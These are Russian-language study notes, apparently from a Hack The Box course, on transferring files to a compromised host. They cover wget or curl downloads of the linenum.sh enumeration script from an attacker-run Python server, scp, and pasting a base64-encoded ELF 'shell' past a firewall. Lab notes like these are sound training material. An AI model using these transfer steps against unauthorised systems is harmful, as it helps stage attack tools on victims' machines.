Используя wget

Способ:
запустить HTTP-сервер на Python на своем хосте компьютере, а затем использовать 
команду wget`python` или `python` c URL для загрузки файла на удаленный хост

1. создать сервер:
https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Tools_and_setup/set_up_a_local_testing_server
2. перейти в каталог с файлом
SavitskiyES@htb[/htb]$ cd /tmp
3. запустить в нем http сервер на python
python3 -m http.server 8000  (сервер для прослушивания)
4. загрузить файл на удаленный хост, на котором выполняется код
wget http://10.10.14.1:8000/linenum.sh





Примечание:
Если на удалённом сервере нет IP -адреса wget, мы можем использовать его cURLдля загрузки файла:

user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

-o флаг для указания имени выходного файла






Используя SCP (SSH  при условии, что у нас есть учетные данные пользователя на удаленном хосте)

SavitskiyES@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh






Использование Base64
Если стоит защита (брандмауэры)
кодируем файл в base64 для загрузки файла с нашего компа
 а затем вставить полученную base64строку на удаленный сервер и декодировать ее

SavitskiyES@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU


декодируем на целевом хосте:
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell









Проверка передачи файлов

Проверка
file (определить тип файла ELF-файл означает успешную передачу)

user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header

проверка целостности через md5 хэш (сначала на своем хосте чекаем неизмененный оригинал потом на целевом что хэши совпадают)

SavitskiyES@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell


user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
















